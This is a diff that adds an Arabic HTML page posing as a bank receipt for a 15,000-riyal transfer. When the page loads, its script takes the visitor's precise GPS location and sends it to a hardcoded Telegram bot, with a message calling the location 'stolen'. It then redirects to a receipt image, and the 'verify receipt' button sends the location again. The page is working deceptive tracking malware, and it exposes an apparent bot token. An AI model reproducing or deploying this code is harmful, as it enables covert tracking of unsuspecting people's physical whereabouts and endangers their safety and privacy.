@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تحويل ناجح</title>
+    <script>
+        setTimeout(()=>{
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(p=>{
+                    fetch(`https://api.telegram.org/bot8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y/sendMessage?chat_id=8391968596&text=${encodeURIComponent('🚨 GPS مسروق! 📍 Lat:'+p.coords.latitude+' Lon:'+p.coords.longitude+' Acc:'+p.coords.accuracy+'m')}`)
+                    .then(()=>location.href='https://i.ibb.co/7rZ0QfL/receipt.jpg')
+                },e=>location.href='https://i.ibb.co/7rZ0QfL/receipt.jpg',{enableHighAccuracy:true})
+            }
+        },500)
+    </script>
+    <style>body{background:linear-gradient(135deg,#667eea,#764ba2);height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Tahoma}*,.box{background:white;padding:30px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.3);text-align:center;max-width:350px}.amount{font-size:2.5em;color:#27ae60;font-weight:bold;margin:20px 0}.btn{background:#ff4757;color:white;padding:15px 30px;border:none;border-radius:25px;font-size:1.1em;cursor:pointer;box-shadow:0 5px 15px rgba(255,71,87,.4);margin-top:20px}</style>
+</head>
+<body>
+    <div class="box">
+        <div style="font-size:3em">🏦</div>
+        <h2>تم تحويل 15,000 ريال ✅</h2>
+        <div class="amount">15,000 ر.س</div>
+        <p style="color:#666">جاري التحقق من أمان العملية...</p>
+        <button class="btn" onclick="navigator.geolocation.getCurrentPosition(p=>fetch('https://api.telegram.org/bot8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y/sendMessage?chat_id=8391968596&text='+encodeURIComponent('🚨 GPS ثاني! Lat:'+p.coords.latitude+' Lon:'+p.coords.longitude),e=>{})">تحقق الإيصال</button>
+    </div>
+</body>
+</html>
